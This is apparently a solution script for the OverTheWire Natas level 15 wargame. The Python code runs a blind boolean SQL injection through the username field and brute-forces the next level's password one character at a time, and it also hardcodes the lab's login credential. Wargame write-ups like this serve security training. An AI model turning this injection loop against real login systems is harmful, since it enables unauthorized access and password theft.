import requests
import string

url = "http://natas15.natas.labs.overthewire.org/index.php?debug=true"
natas15_Username = "natas15"
natas15_Password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

natas16_Username = "natas16"
natas16_Password = ""
bruteforce_Charlist = "AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789"
# query = f'{natas16_Username}" AND password LIKE BINARY "{natas16_Password}%" # '

# responce = requests.post(url,
#                          auth=(natas15_Username, natas15_Password), data={'username': query})
# responce_HTML = responce.text
# print(responce_HTML)
passFile = open("./Natas16 Password.txt", 'a+')
passFile.write('Natas 16 Password Is: ')

while len(natas16_Password) != 32:
    for char in bruteforce_Charlist:
        # print(f"Checking Char: {char}")
        query = f'{natas16_Username}" AND password LIKE BINARY "{natas16_Password + char}%" # '
        responce = requests.post(url,
                                 auth=(natas15_Username, natas15_Password), data={'username': query})
        print(f"Char {char} is checked.")
        # print(responce.text)

        if "This user exists." in responce.text:
            natas16_Password += char
            print(f"\nPassword: {natas16_Password}\n" +
                  f"Password Length: {len(natas16_Password)}\n")
            passFile.write(char)
            break

print(
    f"\nBruteforce Was Successful. We Find And Saved Password.\nNatas 16 Password Is: {natas16_Password}\n")


passFile.close()
